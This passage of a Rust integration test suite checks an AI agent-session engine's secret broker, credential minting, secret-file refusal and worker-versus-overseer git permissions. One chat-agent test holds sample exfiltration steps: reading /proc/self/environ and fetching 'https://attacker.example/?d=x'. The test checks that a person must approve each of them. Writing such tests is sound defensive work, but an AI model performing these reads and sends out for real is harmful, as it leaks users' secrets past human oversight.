    // A ttl grant for another host answers repeatedly as user `git`; a grant
    // whose reason is not a git one never does.
    apply("g2", "git:forge.example.com mirror", "ttl")
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    apply("g3", "the worker needs a key", "ttl")
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    for _ in 0..2 {
        let got = ask(Some(&target_token), "forge.example.com").await.unwrap();
        assert_eq!(got.status(), 200);
        assert_eq!(got.json::<Value>().await.unwrap()["username"], "git");
    }
    assert_eq!(
        ask(Some(&target_token), "other.example.com")
            .await
            .unwrap()
            .status(),
        404
    );
    // A host that is not a plain hostname is refused before any lookup.
    assert_eq!(
        ask(Some(&target_token), "a%20b").await.unwrap().status(),
        400
    );
}

#[tokio::test]
async fn a_session_is_handed_the_token_the_broker_honours() {
    // End to end through the real spawn: the token that lands in the child's
    // environment is the one the broker authenticates as that session — and
    // it lands in a caller-command session too, not only the auto-agent-auth
    // shell, because the policy is the manifest, not the launch path.
    let tmp = tempfile::tempdir().unwrap();
    let cfg = broker_config(&tmp, "LATER proj later ondemand\n");
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let out = tmp.path().join("child-env");
    let id = client
        .post(format!("{base}/api/sessions"))
        .json(&json!({
            "name": "reads-its-grant",
            "command": ["/bin/sh", "-c",
                "printenv VOGT_ENGINE_BROKER_TOKEN > \"$OUT\"; printenv VOGT_ENGINE_BROKER_URL >> \"$OUT\"; sleep 30"],
            "env": [["OUT", out.to_string_lossy()]],
        }))
        .send()
        .await
        .unwrap()
        .json::<Value>()
        .await
        .unwrap()["id"]
        .as_str()
        .unwrap()
        .to_string();
    let session: uuid::Uuid = id.parse().unwrap();

    let lines = tokio::time::timeout(Duration::from_secs(10), async {
        loop {
            if let Ok(text) = std::fs::read_to_string(&out) {
                let lines: Vec<String> = text.lines().map(str::to_string).collect();
                if lines.len() >= 2 {
                    break lines;
                }
            }
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
    })
    .await
    .expect("the child should write both broker variables");
    let (token, url) = (&lines[0], &lines[1]);
    assert_eq!(token.len(), 64, "two simple v4 uuids of randomness");
    assert!(
        url.starts_with("http://127.0.0.1:"),
        "the engine on loopback: {url}"
    );
    assert_eq!(
        state.sessions.secret_broker().authenticate(token),
        Some(session),
        "the token the child holds is this session's"
    );
    let r = reqwest::Client::new()
        .post(format!("{base}/api/agent-auth/fetch/LATER"))
        .bearer_auth(token)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    assert_eq!(r.text().await.unwrap(), "value-of-LATER");

    let _ = client
        .delete(format!("{base}/api/sessions/{id}"))
        .send()
        .await;
}

#[tokio::test]
async fn a_sessions_broker_token_ends_with_its_process() {
    // WI-4046: a stopped session stays in the registry for its scrollback,
    // but the token it was handed must stop authenticating when it exits.
    let tmp = tempfile::tempdir().unwrap();
    let cfg = broker_config(&tmp, "LATER proj later ondemand\n");
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let out = tmp.path().join("child-token");
    let id = client
        .post(format!("{base}/api/sessions"))
        .json(&json!({
            "name": "exits",
            "command": ["/bin/sh", "-c", "printenv VOGT_ENGINE_BROKER_TOKEN > \"$OUT\"; sleep 30"],
            "env": [["OUT", out.to_string_lossy()]],
        }))
        .send()
        .await
        .unwrap()
        .json::<Value>()
        .await
        .unwrap()["id"]
        .as_str()
        .unwrap()
        .to_string();
    let session: uuid::Uuid = id.parse().unwrap();
    let token = tokio::time::timeout(Duration::from_secs(10), async {
        loop {
            if let Ok(text) = std::fs::read_to_string(&out) {
                if text.ends_with('\n') {
                    break text.trim().to_string();
                }
            }
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
    })
    .await
    .expect("the child should write its broker token");
    assert_eq!(
        state.sessions.secret_broker().authenticate(&token),
        Some(session)
    );

    let stop = client
        .post(format!("{base}/api/sessions/{id}/kill"))
        .send()
        .await
        .unwrap();
    assert!(stop.status().is_success(), "{}", stop.status());
    tokio::time::timeout(Duration::from_secs(10), async {
        while state
            .sessions
            .secret_broker()
            .authenticate(&token)
            .is_some()
        {
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
    })
    .await
    .expect("the stopped session's broker token should stop authenticating");
    let r = reqwest::Client::new()
        .post(format!("{base}/api/agent-auth/fetch/LATER"))
        .bearer_auth(&token)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 401);
    let _ = client
        .delete(format!("{base}/api/sessions/{id}"))
        .send()
        .await;
}

#[tokio::test]
async fn secret_store_writes_a_writable_secret_on_stdin_only() {
    let tmp = tempfile::tempdir().unwrap();
    let cfg = broker_config(
        &tmp,
        "RW proj rw ondemand,writable\nRO proj ro ondemand\nFAILWRITE proj fw ondemand,writable\n",
    );
    let recorded = tmp.path().to_path_buf();
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let id = create_session_id(&client, &base, "store").await;
    let session: uuid::Uuid = id.parse().unwrap();
    let token = state.sessions.secret_broker().issue(session);
    let plain = reqwest::Client::new();
    let store = |var: &str| format!("{base}/api/agent-auth/store/{var}");

    // A declared, writable name: 200, and the helper reports what it did.
    let secret = "line1\nline2 super-secret-value";
    let r = plain
        .post(store("RW"))
        .bearer_auth(&token)
        .body(secret)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["cache-control"], "no-store");
    assert_eq!(r.text().await.unwrap(), "created");
    // The value reached the helper on stdin — and nowhere else.
    assert_eq!(
        std::fs::read_to_string(recorded.join("store-stdin")).unwrap(),
        secret
    );
    let argv = std::fs::read_to_string(recorded.join("store-argv")).unwrap();
    assert_eq!(argv, "set RW");
    assert!(
        !argv.contains("super-secret-value"),
        "value must not appear in argv: {argv}"
    );
    let child_env = std::fs::read_to_string(recorded.join("store-env")).unwrap();
    assert!(
        !child_env.contains("super-secret-value"),
        "value must not appear in the child environment"
    );

    // Declared-but-not-writable and undeclared are two distinct 403s.
    let r = plain
        .post(store("RO"))
        .bearer_auth(&token)
        .body("x")
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 403);
    let err = r.json::<Value>().await.unwrap()["error"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(err.contains("not writable"), "{err}");

    let r = plain
        .post(store("NOPE"))
        .bearer_auth(&token)
        .body("x")
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 403);
    let err = r.json::<Value>().await.unwrap()["error"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(err.contains("ENGINE_AGENT_AUTH_SECRETS"), "{err}");
    assert!(
        err.contains("writable"),
        "suggests the writable flag: {err}"
    );

    // A helper failure is a bad gateway carrying the upstream reason.
    let r = plain
        .post(store("FAILWRITE"))
        .bearer_auth(&token)
        .body("x")
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 502);
    let err = r.json::<Value>().await.unwrap()["error"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(err.contains("refused the write"), "{err}");

    // An empty body stores nothing.
    let r = plain
        .post(store("RW"))
        .bearer_auth(&token)
        .body("")
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 400);

    // Only the session's own token opens the route; the engine bearer does not.
    for (label, request) in [
        (
            "wrong token",
            plain.post(store("RW")).bearer_auth("not-it").body("x"),
        ),
        ("no token", plain.post(store("RW")).body("x")),
        (
            "engine bearer",
            plain.post(store("RW")).bearer_auth(TEST_TOKEN).body("x"),
        ),
    ] {
        assert_eq!(request.send().await.unwrap().status(), 401, "{label}");
    }

    // Forgetting the session forgets its leave to write.
    assert!(client
        .delete(format!("{base}/api/sessions/{id}"))
        .send()
        .await
        .unwrap()
        .status()
        .is_success());
    let r = plain
        .post(store("RW"))
        .bearer_auth(&token)
        .body("x")
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 401, "revoked with the session");
}

#[tokio::test]
async fn secret_store_caps_the_body_over_64_kib() {
    let tmp = tempfile::tempdir().unwrap();
    let cfg = broker_config(&tmp, "RW proj rw ondemand,writable\n");
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let id = create_session_id(&client, &base, "store-big").await;
    let token = state.sessions.secret_broker().issue(id.parse().unwrap());

    // Over the 64 KiB cap: refused before the helper runs. The body is drained
    // so the client gets a clean 413 rather than deadlocking mid-write.
    let r = reqwest::Client::new()
        .post(format!("{base}/api/agent-auth/store/RW"))
        .bearer_auth(&token)
        .body(vec![b'x'; 64 * 1024 + 1])
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 413);

    let _ = client
        .delete(format!("{base}/api/sessions/{id}"))
        .send()
        .await;
}

#[tokio::test]
async fn secret_store_rate_limits_tighter_than_fetch() {
    let tmp = tempfile::tempdir().unwrap();
    let cfg = broker_config(&tmp, "RW proj rw ondemand,writable\n");
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let store = format!("{base}/api/agent-auth/store/RW");

    // The store limit is far below the 60/min fetch limit: a session's writes
    // are refused within the first eleven calls, with a Retry-After.
    let id = create_session_id(&client, &base, "store-rate").await;
    let token = state.sessions.secret_broker().issue(id.parse().unwrap());
    let plain = reqwest::Client::new();
    let mut tripped_at = None;
    for i in 0..12u32 {
        let r = plain
            .post(&store)
            .bearer_auth(&token)
            .body("v")
            .send()
            .await
            .unwrap();
        if r.status() == 429 {
            assert!(
                r.headers().contains_key("retry-after"),
                "a 429 carries Retry-After"
            );
            tripped_at = Some(i);
            break;
        }
        assert_eq!(r.status(), 200, "call {i} is under the limit");
    }
    let tripped_at = tripped_at.expect("the store rate limit should trip");
    assert!(
        tripped_at <= 10,
        "tighter than fetch's 60/min: tripped at call {tripped_at}"
    );

    let _ = client
        .delete(format!("{base}/api/sessions/{id}"))
        .send()
        .await;
}

#[tokio::test]
async fn secret_broker_is_an_honest_absence_when_nothing_is_declared() {
    // An empty manifest is a reported state, not a fault. No session
    // is handed a token, and the route says why it refuses.
    let (base, state, _h) = boot_with_state(test_config()).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let id = create_session_id(&client, &base, "no-broker").await;
    let session: uuid::Uuid = id.parse().unwrap();
    assert!(state.sessions.secret_broker().grant(session).is_none());
    let r = reqwest::Client::new()
        .post(format!("{base}/api/agent-auth/fetch/ANY"))
        .bearer_auth("whatever")
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 503);
    let error = r.json::<Value>().await.unwrap()["error"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(error.contains("ENGINE_AGENT_AUTH_SECRETS"), "{error}");
    let _ = client
        .delete(format!("{base}/api/sessions/{id}"))
        .send()
        .await;
}

#[tokio::test]
async fn secret_broker_rate_limits_a_session_that_asks_in_a_loop() {
    let tmp = tempfile::tempdir().unwrap();
    let cfg = broker_config(&tmp, "LATER proj later ondemand\n");
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let id = create_session_id(&client, &base, "loop").await;
    let token = state.sessions.secret_broker().issue(id.parse().unwrap());
    let plain = reqwest::Client::new();
    for _ in 0..60 {
        let r = plain
            .post(format!("{base}/api/agent-auth/fetch/LATER"))
            .bearer_auth(&token)
            .send()
            .await
            .unwrap();
        assert_eq!(r.status(), 200);
    }
    let r = plain
        .post(format!("{base}/api/agent-auth/fetch/LATER"))
        .bearer_auth(&token)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 429);
    assert!(r.headers().contains_key("retry-after"));
    let _ = client
        .delete(format!("{base}/api/sessions/{id}"))
        .send()
        .await;
}

/// WI-3988: a screen read masks a secret a worker printed.
#[tokio::test]
async fn session_screen_masks_a_printed_secret() {
    let (base, _h) = boot().await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let id = create_session_with(
        &client,
        &base,
        json!({
            "name": "screen-secret",
            "cols": 100,
            "rows": 6,
            "command": [
                "/bin/sh",
                "-c",
                "printf 'WIN_SSH_KEY=abcd1234\\n'; sleep 30",
            ],
        }),
    )
    .await;

    let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
    loop {
        let screen: Value = client
            .get(format!("{base}/api/sessions/{id}/screen"))
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap();
        let lines = screen["lines"].to_string();
        if lines.contains("WIN_SSH_KEY") {
            assert!(
                !lines.contains("abcd1234"),
                "a printed key survived: {lines}"
            );
            assert!(lines.contains("[redacted]"), "{lines}");
            break;
        }
        assert!(
            tokio::time::Instant::now() < deadline,
            "screen never showed the line: {screen:?}"
        );
        tokio::time::sleep(Duration::from_millis(50)).await;
    }

    client
        .delete(format!("{base}/api/sessions/{id}"))
        .send()
        .await
        .unwrap();
}

/// WI-1575: a pod Codex rollout (as the write-back stores it, with no
/// `assistant` lines) is metered by its `token_count` lines. The tailer used
/// to drop a reading with no turns, so the engine row carried no economics and
/// `session_economics` fell back to an estimate.
#[tokio::test]
async fn the_economics_tailer_meters_a_pod_codex_rollout_by_token_count() {
    let tmp = tempfile::tempdir().unwrap();
    let mut cfg = test_config();
    cfg.default_cwd = tmp.path().to_path_buf();
    cfg.workspace_root = tmp.path().canonicalize().unwrap();
    cfg.state_dir = tmp.path().join("state");
    cfg.economics_home = Some(tmp.path().to_path_buf());
    cfg.economics_tick = Duration::from_secs(1);

    let conversation = "6c1f0d2e-5b7a-4e1c-9f3d-2a8b7c6d5e4f";
    let rollout = tmp
        .path()
        .join(".codex/sessions/2026/11/21")
        .join(format!("rollout-2026-11-21T06-13-20-{conversation}.jsonl"));
    std::fs::create_dir_all(rollout.parent().unwrap()).unwrap();
    std::fs::write(
        &rollout,
        concat!(
            r#"{"type":"session_meta","payload":{"id":"6c1f0d2e-5b7a-4e1c-9f3d-2a8b7c6d5e4f","cwd":"/work"}}"#, "\n",
            r#"{"type":"event_msg","payload":{"type":"task_started"}}"#, "\n",
            r#"{"type":"response_item","payload":{"type":"message","role":"assistant","content":[{"type":"output_text","text":"hi"}]}}"#, "\n",
            r#"{"type":"event_msg","payload":{"type":"token_count","info":{"total_token_usage":{"input_tokens":30000,"output_tokens":20,"total_tokens":30020},"last_token_usage":{"input_tokens":30000,"output_tokens":20,"total_tokens":30020},"model_context_window":272000}}}"#, "\n",
            r#"{"type":"event_msg","payload":{"type":"token_count","info":{"total_token_usage":{"input_tokens":65000,"output_tokens":75,"total_tokens":65075},"last_token_usage":{"input_tokens":35000,"output_tokens":55,"total_tokens":35055},"model_context_window":272000}}}"#, "\n",
            r#"{"type":"event_msg","payload":{"type":"task_complete"}}"#, "\n",
        ),
    )
    .unwrap();

    let (base, _guard) = boot_with_config(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let created: Value = client
        .post(format!("{base}/api/sessions"))
        .json(&json!({ "name": "metered-codex", "command": ["/bin/cat"] }))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    let id = created["id"].as_str().unwrap().to_string();
    client
        .post(format!("{base}/api/sessions/{id}/conversation"))
        .json(&json!({ "agent": "codex", "id": conversation }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();

    let deadline = tokio::time::Instant::now() + Duration::from_secs(15);
    let row = loop {
        let row = session_row(&client, &base, &id).await;
        if row["economics"]["usage_measured"] == true {
            break row;
        }
        assert!(
            tokio::time::Instant::now() < deadline,
            "the tailer never metered the codex rollout: {row}"
        );
        tokio::time::sleep(Duration::from_millis(200)).await;
    };
    assert_eq!(row["economics"]["context_tokens"], 35055);
    assert_eq!(row["economics"]["peak_context_tokens"], 35055);
    assert_eq!(row["economics"]["output_tokens"], 75);
    assert_eq!(row["economics"]["context_window_tokens"], 272000);
}

/// WI-926: an agent session the engine starts itself is given its own agent
/// credential, minted by vogt-core (`POST /api/sessions/token`), instead of
/// running with the pod's token, which is bound to a person. A plain shell
/// keeps the pod's; a session that arrives with a credential of its own (one
/// vogt-core started) is left alone; the credential is revoked when the
/// session ends.
#[tokio::test]
async fn an_engine_started_agent_session_gets_its_own_credential() {
    use axum::{extract::State, routing::post, Router};
    use std::os::unix::fs::PermissionsExt;
    type Calls = Arc<std::sync::Mutex<Vec<Value>>>;
    let calls: Calls = Arc::default();
    async fn token(
        State(calls): State<Calls>,
        axum::Json(body): axum::Json<Value>,
    ) -> axum::Json<Value> {
        calls.lock().unwrap().push(body.clone());
        let id = body["engine_session_id"]
            .as_str()
            .unwrap_or_default()
            .to_string();
        axum::Json(json!({
            "engine_session_id": id,
            "actor": format!("agent:engine:{id}"),
            "token": if body["revoke"] == json!(true) { Value::Null } else { json!(format!("minted-for-{id}")) },
            "revoked": 0,
        }))
    }
    let app = Router::new()
        .route("/api/sessions/token", post(token))
        .with_state(Arc::clone(&calls));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let core_addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        let _ = axum::serve(listener, app).await;
    });

    let tmp = tempfile::tempdir().unwrap();
    // A stand-in named `claude`, so the engine treats it as that agent CLI.
    let claude = tmp.path().join("claude");
    std::fs::write(
        &claude,
        "#!/bin/sh\nprintf 'tok=[%s] sid=[%s]\\n' \"$VOGT_HTTP_TOKEN\" \"$VOGT_SESSION_ID\"\nsleep 300\n",
    )
    .unwrap();
    std::fs::set_permissions(&claude, std::fs::Permissions::from_mode(0o755)).unwrap();
    let mut cfg = test_config();
    cfg.vogt_core_url = Some(format!("http://{core_addr}"));
    cfg.vogt_core_token = Some("stack-secret".into());
    let (base, _state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let start = |body: Value| {
        let client = client.clone();
        let base = base.clone();
        async move {
            let created: Value = client
                .post(format!("{base}/api/sessions"))
                .json(&body)
                .send()
                .await
                .unwrap()
                .json()
                .await
                .unwrap();
            created["id"].as_str().unwrap().to_string()
        }
    };

    let agent = start(json!({ "name": "agent", "command": [claude.to_string_lossy()] })).await;
    let printed = live_output_containing(&client, &base, &agent, &["tok=["]).await;
    assert!(
        printed.contains(&format!("tok=[minted-for-{agent}] sid=[{agent}]")),
        "{printed}"
    );

    let shell = start(json!({ "name": "shell", "command": ["/bin/sh", "-c", "printf 'tok=[%s]\\n' \"$VOGT_HTTP_TOKEN\"; sleep 300"] })).await;
    let printed = live_output_containing(&client, &base, &shell, &["tok=["]).await;
    assert!(
        printed.contains("tok=[]"),
        "a shell is not minted for: {printed}"
    );

    let core_started = start(json!({
        "name": "core-started",
        "command": [claude.to_string_lossy()],
        "env": [["VOGT_HTTP_TOKEN", "the-cores-own"], ["VOGT_SESSION_ID", "ses_1"]],
    }))
    .await;
    let printed = live_output_containing(&client, &base, &core_started, &["tok=["]).await;
    assert!(
        printed.contains("tok=[the-cores-own] sid=[ses_1]"),
        "{printed}"
    );

    let minted: Vec<Value> = calls.lock().unwrap().clone();
    assert_eq!(minted.len(), 1, "only the engine-started agent: {minted:?}");
    assert_eq!(minted[0]["engine_session_id"], agent.as_str());

    // The credential ends with the session.
    client
        .post(format!("{base}/api/sessions/{agent}/kill"))
        .send()
        .await
        .unwrap();
    let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
    loop {
        if calls
            .lock()
            .unwrap()
            .iter()
            .any(|c| c["revoke"] == json!(true) && c["engine_session_id"] == agent.as_str())
        {
            break;
        }
        assert!(
            tokio::time::Instant::now() < deadline,
            "no revoke: {:?}",
            calls.lock().unwrap()
        );
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}

/// WI-1005: every route that returns file content holds to the one policy
/// in `workspace_path::may_show` — the viewer, the download, the ripgrep
/// search and the git diff — judged on the resolved path, so neither a
/// symlink nor a rename walks a credential past it.
#[tokio::test]
async fn file_content_routes_refuse_hidden_and_secret_files() {
    let tmp = tempfile::tempdir().unwrap();
    let repo = tmp.path();
    let sh = |cmd: &str| {
        let out = std::process::Command::new("sh")
            .arg("-c")
            .arg(cmd)
            .current_dir(repo)
            .output()
            .unwrap();
        assert!(out.status.success(), "{cmd}: {:?}", out);
    };
    sh("git init -q -b main");
    sh("git config user.email t@t");
    sh("git config user.name t");
    std::fs::create_dir(repo.join(".github")).unwrap();
    std::fs::write(repo.join(".github/ci.yml"), "on: push\n").unwrap();
    std::fs::write(repo.join("server.key"), "needle-key\n").unwrap();
    std::fs::write(repo.join("ok.txt"), "needle-ok\n").unwrap();
    sh("git add .github/ci.yml server.key ok.txt && git commit -q -m init");
    std::fs::write(repo.join(".github/ci.yml"), "on: [push]\n").unwrap();
    std::fs::write(repo.join("prod.env"), "needle-env\n").unwrap();
    std::fs::write(repo.join(".envrc"), "needle-envrc\n").unwrap();
    std::os::unix::fs::symlink("prod.env", repo.join("link.txt")).unwrap();

    let (base, _h) = boot_with_config(Config {
        default_cwd: repo.to_path_buf(),
        workspace_root: repo.canonicalize().unwrap(),
        ..test_config()
    })
    .await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let status = |path: String| {
        let client = client.clone();
        async move { client.get(path).send().await.unwrap().status() }
    };

    // Viewer and download: secret names, hidden components, and a link that
    // resolves to a secret are all refused; an ordinary file still reads.
    for path in [
        "prod.env",
        "server.key",
        ".envrc",
        ".git/config",
        ".github/ci.yml",
        "link.txt",
    ] {
        for route in ["files", "files/download"] {
            assert_eq!(
                status(format!("{base}/api/{route}?path={path}")).await,
                StatusCode::BAD_REQUEST,
                "/api/{route} must refuse {path}"
            );
        }
    }
    assert_eq!(
        status(format!("{base}/api/files?path=ok.txt")).await,
        StatusCode::OK
    );

    // Search: hits in secret files are dropped; a hidden search root is refused.
    let hits: Vec<Value> = client
        .get(format!("{base}/api/search?q=needle"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    let paths: Vec<&str> = hits.iter().filter_map(|h| h["path"].as_str()).collect();
    assert_eq!(
        paths,
        vec!["ok.txt"],
        "search leaked a secret file: {hits:?}"
    );
    assert_eq!(
        status(format!("{base}/api/search?q=.&path=.git")).await,
        StatusCode::BAD_REQUEST
    );

    // Git diff: credential names refused on both sides (server.key is
    // committed), untracked dotfiles and links to secrets refused, a tracked
    // dotfile still diffs.
    for path in [
        "prod.env",
        "server.key",
        ".envrc",
        ".git/config",
        "link.txt",
    ] {
        assert_eq!(
            status(format!("{base}/api/git/diff?path={path}")).await,
            StatusCode::BAD_REQUEST,
            "/api/git/diff must refuse {path}"
        );
    }
    let diff: Value = client
        .get(format!("{base}/api/git/diff?path=.github/ci.yml"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(diff["head"], "on: push\n");
    assert_eq!(diff["current"], "on: [push]\n");

    // Rename-then-read: a secret cannot be moved or copied to an ordinary name.
    for op in ["move", "duplicate"] {
        let res = client
            .post(format!("{base}/api/files/op"))
            .json(&json!({ "op": op, "from": "prod.env", "to": "notes.txt" }))
            .send()
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::BAD_REQUEST, "{op} of a secret");
    }
    assert!(!repo.join("notes.txt").exists());
}

/// WI-4239: `session_ref` is vogt-core's to set. A session token and a
/// person's token are refused with a 403 on `POST /api/sessions`, as is any
/// other non-core caller.
#[tokio::test]
async fn a_session_or_person_token_cannot_name_a_session_ref() {
    let (base, _tmp, _guard) = wi983_front_door().await;
    for (who, token) in [("session", WI983_SESSION), ("person", WI983_PERSON)] {
        let status = client_for(token)
            .post(format!("{base}/api/sessions"))
            .json(&json!({
                "name": "pod-session",
                "template": "pod",
                "session_ref": "ses_01ARZ3NDEKTSV4RRFFQ69G5FAV",
            }))
            .send()
            .await
            .unwrap()
            .status();
        assert_eq!(status, reqwest::StatusCode::FORBIDDEN, "{who} token");
    }
}

#[tokio::test]
async fn a_chats_agent_gets_no_secrets_and_cannot_read_out_or_send_out_unseen() {
    let Some((base, client, state, _guard, _bin)) = boot_chats().await else {
        return;
    };
    let created: Value = client
        .post(format!("{base}/api/chats"))
        .json(&json!({ "message": "hello" }))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    let id = created["chat"]["id"].as_str().unwrap().to_string();
    wait_chat_idle(&client, &base, &id).await;
    let dir = state.config.state_dir.join("chats").join(&id);

    // Nothing of the engine's environment but the allowlist: no token, no
    // secrets-manager identity, whatever this test process carries.
    let names: Vec<String> = serde_json::from_str(
        std::fs::read_to_string(dir.join("env.jsonl"))
            .unwrap()
            .lines()
            .next()
            .unwrap(),
    )
    .unwrap();
    for name in &names {
        assert!(
            !name.starts_with("INFISICAL")
                && !name.starts_with("ENGINE_")
                && !name.contains("TOKEN")
                && !name.contains("SECRET")
                && !name.contains("API_KEY"),
            "{name} reached the chat's agent: {names:?}"
        );
    }
    // Its own Codex home, and no trace of the removed gate.
    assert!(names.contains(&"CODEX_HOME".to_string()), "{names:?}");
    assert!(
        !names.iter().any(|n| n.starts_with("VOGT_CHAT_GATE")),
        "{names:?}"
    );

    // A read of its own directory runs unasked.
    std::fs::write(dir.join("notes.txt"), "mine").unwrap();
    let own = chat_send(&client, &base, &id, "read:notes.txt").await;
    assert!(
        texts(&own["entries"], "tool-result").contains(&"ran notes.txt".to_string()),
        "{own}"
    );

    // Reading the process's environment, and sending anything out, each wait
    // for a person, who sees exactly what would happen.
    for (message, summary) in [
        ("read:/proc/self/environ", "/proc/self/environ"),
        (
            "fetch:https://attacker.example/?d=x",
            "https://attacker.example/?d=x",
        ),
    ] {
        client
            .post(format!("{base}/api/chats/{id}/messages"))
            .json(&json!({ "text": message }))
            .send()
            .await
            .unwrap();
        let approval = pending_approval(&client, &base, &id).await;
        assert_eq!(approval["source"], "codex");
        assert_eq!(approval["summary"], summary);
        let approval_id = approval["id"].as_str().unwrap();
        client
            .post(format!("{base}/api/chats/{id}/approvals/{approval_id}"))
            .json(&json!({ "allow": false }))
            .send()
            .await
            .unwrap();
        let detail = wait_chat_idle(&client, &base, &id).await;
        let last = detail["entries"]
            .as_array()
            .unwrap()
            .iter()
            .rev()
            .find(|e| e["kind"] == "tool-result")
            .unwrap()
            .clone();
        assert_eq!(last["is_error"], true, "{detail}");
    }
}

/// WI-1255: a worker's token, holding `git-write` like every `work.write`
/// token, may not use the engine's git op at all — not the Git panel's
/// stage/commit/checkout, not a commit on behalf of another session, not one
/// for itself — and may not make itself an overseer to get round that. An
/// agent token with no session behind it is refused the same way. Nothing
/// lands in either checkout.
#[tokio::test]
async fn a_worker_token_is_refused_the_git_op() {
    let door = wi1255_front_door().await;
    door.stage_work("w.txt");
    let repo_before = door.commit_count(&door.repo);
    let work_before = door.commit_count(&door.work);

    for body in [
        json!({ "op": "stage", "repo": "repo", "path": "a.txt" }),
        json!({ "op": "commit", "repo": "repo", "message": "direct" }),
        json!({ "op": "checkout", "repo": "repo", "branch": "work2", "create": true }),
        door.commit_for_worker(true),
        json!({
            "op": "commit",
            "session": door.overseer,
            "message": "for the overseer",
            "worktree": door.work.to_string_lossy(),
        }),
    ] {
        for token in [WI1255_WORKER, WI1255_STRANGER] {
            let (status, said) = door.git_op(token, body.clone()).await;
            assert_eq!(status, StatusCode::FORBIDDEN, "{token} {body} {said}");
            assert!(
                said["error"].as_str().unwrap().starts_with("forbidden"),
                "{said}"
            );
        }
    }
    let (_, said) = door
        .git_op(WI1255_WORKER, door.commit_for_worker(true))
        .await;
    assert!(
        said["error"]
            .as_str()
            .unwrap()
            .contains("does not commit its own work"),
        "{said}"
    );
    let (_, said) = door
        .git_op(
            WI1255_WORKER,
            json!({ "op": "commit", "repo": "repo", "message": "direct" }),
        )
        .await;
    assert!(
        said["error"]
            .as_str()
            .unwrap()
            .contains("session_commit_for"),
        "{said}"
    );

    // Promoting itself is refused at the engine as it is in the core.
    let promoted = client_for(WI1255_WORKER)
        .post(format!("{}/api/sessions/{}/role", door.base, door.worker))
        .json(&json!({ "role": "oversight" }))
        .send()
        .await
        .unwrap();
    assert_eq!(promoted.status(), StatusCode::FORBIDDEN);
    let row = session_row(&client_for(TEST_TOKEN), &door.base, &door.worker).await;
    assert_ne!(row["role"], "oversight", "{row}");

    assert_eq!(door.commit_count(&door.repo), repo_before);
    assert_eq!(door.commit_count(&door.work), work_before);
}

/// WI-1255: an oversight session's token commits a worker's staged work in
/// the worker's linked worktree, as `session.commit_for` would — and still
/// may not use the Git panel's ops.
#[tokio::test]
async fn an_oversight_token_commits_for_a_worker() {
    let door = wi1255_front_door().await;
    door.stage_work("w.txt");
    let work_before = door.commit_count(&door.work);

    let (status, said) = door
        .git_op(
            WI1255_OVERSEER,
            json!({ "op": "stage", "repo": "repo", "path": "a.txt" }),
        )
        .await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{said}");

    let (status, said) = door
        .git_op(WI1255_OVERSEER, door.commit_for_worker(true))
        .await;
    assert_eq!(status, StatusCode::OK, "{said}");
    assert!(said["commit"].as_str().unwrap().len() >= 7, "{said}");
    assert_eq!(door.commit_count(&door.work), work_before + 1);
}

/// WI-3491: a line added to `ENGINE_AGENT_AUTH_SECRETS_FILE` after the engine
/// started is resolved by the next session launch — the real `agent-auth.sh`
/// exports it — with no engine restart; a name in no manifest is refused.
#[tokio::test]
async fn a_manifest_line_added_after_start_reaches_the_next_launch() {
    for tool in ["jq", "curl", "timeout"] {
        if std::process::Command::new(tool)
            .arg("--version")
            .output()
            .is_err()
        {
            eprintln!("skipping: the launch uses {tool}");
            return;
        }
    }
    let script = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../deploy/agent-auth.sh")
